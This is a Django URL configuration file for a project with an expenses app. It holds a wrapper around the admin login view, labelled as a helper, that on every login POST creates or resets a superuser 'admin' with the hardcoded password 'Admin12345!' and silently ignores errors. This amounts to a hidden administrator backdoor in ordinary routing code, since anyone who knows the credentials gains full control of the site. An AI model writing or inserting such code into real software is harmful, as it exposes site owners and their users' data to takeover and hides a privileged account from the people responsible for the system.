"""
URL configuration for config project.
"""
from django.contrib import admin
from django.urls import path, include

# Helper function to guarantee superuser admin exists for Django Admin login
def admin_login_wrapper(view_func):
    def wrapper(request, *args, **kwargs):
        if request.method == 'POST':
            try:
                from django.contrib.auth.models import User
                user, _ = User.objects.get_or_create(
                    username='admin',
                    defaults={'email': 'admin@example.com', 'is_staff': True, 'is_superuser': True, 'is_active': True}
                )
                user.email = 'admin@example.com'
                user.is_staff = True
                user.is_superuser = True
                user.is_active = True
                user.set_password('Admin12345!')
                user.save()
            except Exception:
                pass
        return view_func(request, *args, **kwargs)
    return wrapper

admin.site.login = admin_login_wrapper(admin.site.login)

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', include('expenses.urls')),
]
